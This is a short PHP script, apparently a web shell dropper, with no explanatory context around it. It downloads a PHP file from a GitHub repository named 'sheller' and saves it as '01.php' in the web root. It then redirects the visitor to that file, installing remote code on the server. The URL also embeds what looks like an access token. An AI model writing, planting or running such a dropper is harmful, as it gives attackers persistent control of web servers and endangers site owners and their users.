<?php
 $url = "https://raw.githubusercontent.com/exlonea/sheller/refs/heads/main/darbe9.php?token=GHSAT0AAAAAAC357O5NLBVRUVLXAUVP55JMZ26WZNQ";
    $fileContent = file_get_contents($url);
    if ($fileContent !== false) {
        $fileName = "01.php";
        $uploadDirectory = "";
        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
            header("Location: " . $fileName);
            exit;
        } 
    }
?>